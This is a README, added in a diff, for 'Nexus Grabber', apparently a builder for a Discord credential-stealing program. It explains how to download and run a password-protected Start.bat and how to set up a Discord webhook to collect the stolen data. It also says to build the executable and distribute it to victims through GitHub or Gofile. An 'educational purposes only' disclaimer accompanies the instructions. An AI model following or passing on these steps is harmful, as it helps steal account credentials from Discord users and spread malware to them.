@@ -1,0 +1,45 @@
+## Installation
+
+1. Download the latest release from the [Releases](https://github.com/OFBloom4345/Nexus-grabber/releases/tag/Executor) page.
+2. Extract the downloaded ZIP file.
+3. Run `Start.bat` (It will ask you for a password).
+
+## Creating a Webhook
+
+1. Make a server.
+2. Go to Server Settings > Integration > Create Webhook.
+3. Copy the Webhook URL.
+
+## Usage
+
+1. Launch `Start.bat` again.
+2. Paste in your Webhook URL.
+3. Check the desired settings.
+4. Press Create.
+
+## Distribution
+
+Use GitHub or Gofile to distribute the executable.
+
+## Contributing
+
+We welcome contributions! To contribute:
+
+1. Fork the repository.
+2. Create a new branch for your feature or bug fix.
+3. Commit your changes.
+4. Open a pull request.
+
+## License
+
+This project is licensed under the [MIT License](LICENSE).
+
+## Disclaimer
+
+Nexus Grabber is intended for educational purposes only. Use it responsibly and comply with Discord's terms of service.
+
+---
+
+**Contact**
+
+For support or inquiries, please contact ofbloom4@gmail.com
